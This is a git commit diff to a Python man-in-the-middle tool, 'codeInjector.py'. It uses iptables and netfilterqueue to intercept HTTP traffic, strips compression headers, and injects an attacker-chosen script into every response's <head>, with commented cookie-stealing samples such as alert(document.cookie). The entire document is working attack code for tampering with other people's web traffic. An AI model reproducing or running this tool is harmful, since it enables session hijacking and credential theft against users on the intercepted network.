cce526f5cb8e87a3d69050a936bd394548bc2fc9
Dnldk36 <daniil500053826@gmail.com>
2024-06-03 15:55:03 -0400

    Code Injection #2

--- Code_Injector7/codeInjector.py
+++ Code_Injector7/codeInjector.py
@@ -1,5 +1,3 @@
-#! /usr/bin/env python
-
 import argparse
 import os
 import subprocess
@@ -7,12 +5,13 @@ import netfilterqueue
 import scapy.all as scapy
 import re
 
-
-def getArg():
+def get_arg():
     parser = argparse.ArgumentParser("File Sniffer")
-    parser.add_argument("-q", "--queue-number", type=int, required=True, dest="queueNumber", metavar="",
+    parser.add_argument("-q", "--queue-number", type=int, required=True, dest="queue_number", metavar="",
                         help="[?] Number of queue")
-    parser.add_argument("-p", "--port", type=int, nargs='+', required=False, default=80, dest="portList", metavar="",
+    parser.add_argument("-s", "--script", required=True, type=str, dest="CIscript", metavar="",
+                        help="[?] Injectable script")
+    parser.add_argument("-p", "--port", type=int, nargs='+', required=False, default=[80], dest="port_list", metavar="",
                         help="[?] Input target app port, you can use pool of port. Default - 80")
     parser.add_argument("-u", "--usage", type=int, required=False, default=0, dest="usage", metavar="",
                         help="[?] Local or Public usage (iptables settings). 0 - Local; Else Public")
@@ -20,127 +19,105 @@ def getArg():
                         help="[?] Print traceback, can extremely close the program -> use iptables --flush. "
                              "0 - No; Else Yes")
     return parser.parse_args()
-def getPorts(arg):
-    port = []
-    if not isinstance(arg, int):
-        for el in getArg().portList:
-            port.append(el)
-    else:
-        port.append(arg)
-    return port
 
-#" alert(document.cookie) "
-injectionScript = '<script>console.log(1)</script>'
-# injectionScript = "<script>alert(\"1\");</script>"
-#injectionScript = "<script>window.onload = function() { alert(1); };</script>"
-ack_list = []
-tag = "</body>"
-byteTag = tag.encode('utf-8')
+def get_ports(arg):
+    if isinstance(arg, list):
+        return arg
+    return [arg]
 
-def decodingLoad(scapy_packet):
+#injection_script = '<script>window.onload = function() { alert(1); };</script>'
+injection_script = '<script>' + get_arg().CIscript + '</script>'
+tag = "<head>"
+byte_tag = tag.encode('utf-8', errors='ignore')
+response_buffers = {}
+
+def modify_load(scapy_packet, new_load):
+    scapy_packet[scapy.Raw].load = new_load
     del scapy_packet[scapy.IP].len
     del scapy_packet[scapy.IP].chksum
     del scapy_packet[scapy.TCP].chksum
-
-    load = scapy_packet[scapy.Raw].load
-    new_load = re.sub('Accept-Encoding:.*?\\r\\n', '', load.decode("utf-8"))
-    scapy_packet[scapy.Raw].load = new_load
-
     return scapy_packet
 
+def decoding_load(scapy_packet):
+    load = scapy_packet[scapy.Raw].load.decode('utf-8', errors='ignore')
+    new_load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)
+    return modify_load(scapy_packet, new_load.encode('utf-8', errors='ignore'))
 
-def CI(load):
-    load = load.decode("utf-8")
+def inject_script(load):
+    load = load.decode('utf-8', errors='ignore')
     if tag in load:
         print("Injecting...")
-        load = load.replace(tag,  injectionScript + tag)
-    return load.encode("utf-8")
+        load = load.replace(tag, tag + injection_script)
+    return load.encode('utf-8', errors='ignore')
 
-def packetProccess(packet):
+def packet_process(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-
+    args = get_arg()
     try:
-        if scapy_packet.haslayer(scapy.Raw):
+        if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
+            load = scapy_packet[scapy.Raw].load
+            packet_id = scapy_packet[scapy.IP].id
 
-            if scapy_packet.haslayer(scapy.TCP):
-                load = scapy_packet[scapy.Raw].load
+            for port in get_ports(args.port_list):
+                if scapy_packet[scapy.TCP].dport == port:
+                    new_packet = decoding_load(scapy_packet)
+                    packet.set_payload(bytes(new_packet))
 
-                for port in getPorts(getArg().portList):
+                elif scapy_packet[scapy.TCP].sport == port:
+                    if b'Content-Length' in load:
+                        content_length = re.search(b'Content-Length:\s*(\d*)', load)
+                        if content_length:
+                            original_length = int(content_length.group(1))
+                            new_length = original_length + len(injection_script)
+                            load = load.replace(content_length.group(1), str(new_length).encode('utf-8', errors='ignore'))
 
-                    if scapy_packet[scapy.TCP].dport == port:
-                        # print("Request", end=" ")
+                    if packet_id not in response_buffers:
+                        response_buffers[packet_id] = b''
 
-                        new_packet = decodingLoad(scapy_packet)
-                        packet.set_payload(bytes(new_packet))
+                    response_buffers[packet_id] += load
 
-                        #print(new_packet.show())
-
-                    elif scapy_packet[scapy.TCP].sport == port:
-                        # print("Response")
-
-                        if b'Content-Length' in load:
-                            contentLength = re.search(b'Content-Length:\s(\d*)', load)
-                            if contentLength:
-                                contentLengthNumber = contentLength.group(1).decode('utf-8')
-                                newContentLength = int(contentLengthNumber) + len(injectionScript)
-                                load = load.replace(contentLengthNumber.encode('utf-8'), str(newContentLength).encode('utf-8'))
-
-                        if b"<!doctype html>" in load or b"<!DOCTYPE html>" in load:
-                            ack_list.append(scapy_packet[scapy.TCP].ack)
-                            print(f"Get ack: {scapy_packet[scapy.TCP].ack}")
-
-
-
-
-                        if re.search(byteTag, load) and scapy_packet[scapy.TCP].ack in ack_list:
-                            load = CI(load)
-                            scapy_packet[scapy.Raw].load = load
-
-                            del scapy_packet[scapy.IP].len
-                            del scapy_packet[scapy.IP].chksum
-                            del scapy_packet[scapy.TCP].chksum
-
+                    if tag.encode('utf-8', errors='ignore') in load.lower():
+                        full_response = response_buffers.pop(packet_id)
+                        if re.search(byte_tag, full_response):
+                            full_response = inject_script(full_response)
+                            scapy_packet = modify_load(scapy_packet, full_response)
                             packet.set_payload(bytes(scapy_packet))
 
-                            print(scapy_packet.show())
-
     except Exception as e:
-        if getArg().error == 0:
+        if args.error == 0:
             print(e)
         else:
             subprocess.call(["iptables", "--flush"])
             print(e.with_traceback())
+
     packet.accept()
 
-
-def fileSnif():
+def file_snif():
     if os.getuid() != 0:
-        print("Use super user mod")
+        print("Use super user mode")
         exit()
 
-    if getArg().usage == 0:
-        subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", f"{getArg().queueNumber}"])
-        subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", f"{getArg().queueNumber}"])
+    args = get_arg()
+    if args.usage == 0:
+        subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", str(args.queue_number)])
+        subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", str(args.queue_number)])
         print("Usage: Local")
-        print("-" * 20)
     else:
-        subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", f"{getArg().queueNumber}"])
+        subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", str(args.queue_number)])
         print("Usage: Public")
-        print("-" * 20)
 
+    print("-" * 20)
     queue = netfilterqueue.NetfilterQueue()
-    queue.bind(getArg().queueNumber, packetProccess)
+    queue.bind(args.queue_number, packet_process)
     queue.run()
-
 
 if __name__ == '__main__':
     try:
-        print(f"Ports: {getArg().portList}")
-        if getArg().error == 0:
-            print("Traceback: No")
-        else:
-            print("Traceback: Yes")
-        fileSnif()
+        args = get_arg()
+        print(f"Ports: {args.port_list}")
+        print("Traceback: Yes" if args.error else "Traceback: No")
+        print(f"Script: {injection_script}")
+        file_snif()
     except KeyboardInterrupt:
         subprocess.call(["iptables", "--flush"])
         print("\nDetected ctrl + C")
